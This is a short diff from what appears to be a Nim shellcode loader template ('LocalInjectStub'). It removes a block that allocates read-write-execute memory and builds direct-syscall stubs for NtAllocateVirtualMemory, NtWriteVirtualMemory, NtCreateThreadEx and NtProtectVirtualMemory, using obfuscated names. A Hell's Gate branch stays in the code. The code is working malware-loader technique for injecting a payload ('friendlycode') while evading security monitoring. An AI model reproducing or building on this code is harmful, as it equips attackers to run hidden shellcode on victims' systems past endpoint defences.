@@ -37,35 +37,7 @@ let LocalInjectStub*  = """
             status          : NTSTATUS          = 0x00000000
             buffer          : LPVOID
             dataSz          : SIZE_T            = cast[SIZE_T](friendlycode.len)
-            
-        when defined(GetSyscallStub):
-            when defined(DInvoke):
-                let syscallStub_NtAlloc = MyVirtualAllocEx(pHandle,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
-            else:
-                let syscallStub_NtAlloc = VirtualAllocEx(pHandle,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
-            var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
-            var oldProtection: DWORD = 0
-            var success: BOOL
-
-            # define NtAllocateVirtualMemory
-            let NtAllocateVirtualMemory = cast[myNtAllocateVirtM](cast[LPVOID](syscallStub_NtAlloc))
-            # define NtWriteVirtualMemory
-            let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
-            
-            success = GetSyscallStub(obf("NtAllocateVirtualMemory"), cast[LPVOID](syscallStub_NtAlloc))
-            success = GetSyscallStub(obf("NtWriteVirtualMemory"), cast[LPVOID](syscallStub_NtWrite))
-
-            when defined(LocalCreateThread):
-                var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
-                # define NtCreateThreadEx
-                let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
-                success = GetSyscallStub(obf("NtCreateThreadEx"), cast[LPVOID](syscallStub_NtCreate))
-            when defined(RX):
-                var syscallStub_NtProtect: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE*2)
-                # define NtProtectVirtualMemory
-                let NtProtectVirtualMemory = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
-                success = GetSyscallStub(obf("NtProtectVirtualMemory"), cast[LPVOID](syscallStub_NtProtect))
-            
+        
 
         when defined(Hellsgate):
             if getSyscall(ntAllocTable):
